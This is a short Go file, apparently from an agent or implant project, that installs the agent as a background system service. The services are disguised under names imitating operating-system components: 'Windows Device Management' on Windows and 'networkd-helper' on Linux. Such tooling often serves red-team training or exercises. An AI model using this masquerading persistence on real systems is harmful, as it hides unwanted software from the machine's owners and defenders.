// This defines the setup of the agent as a system service.
// The logic is separated to allow for running the executable
// standalone as well as as a service
package main

import (
	"log"
	"runtime"

	"github.com/MeHungr/peanut-butter/internal/agent"
	"github.com/kardianos/service"
)

func getServiceConfig() *service.Config {
	var svcName, svcDisplayName, svcDesc string
	switch runtime.GOOS {
	// Windows config
	case "windows":
		svcName = "SystemBroker"
		svcDisplayName = "Windows Device Management"
		svcDesc = "Provides device configuration and policy synchronization."
	// Linux config
	default:
		svcName = "networkd-helper"
		svcDisplayName = "Network Daemon Helper"
		svcDesc = "Provides background network configuration and synchronization tasks."
	}

	return &service.Config{
		Name: svcName,
		DisplayName: svcDisplayName,
		Description: svcDesc,
	}
}

type program struct {
	agent *agent.Agent
}

func (p *program) Start(s service.Service) error {
	// Start should not block. Run agent in background
	go p.run()
	return nil
}

func (p *program) run() {
	// Calls the agent start method
	p.agent.Start()
}

func (p *program) Stop(s service.Service) error {
	// Process will exit when killed. If debug is enabled, print msg
	if p.agent.Debug {
		log.Println("Stopping agent service...")
	}
	return nil
}
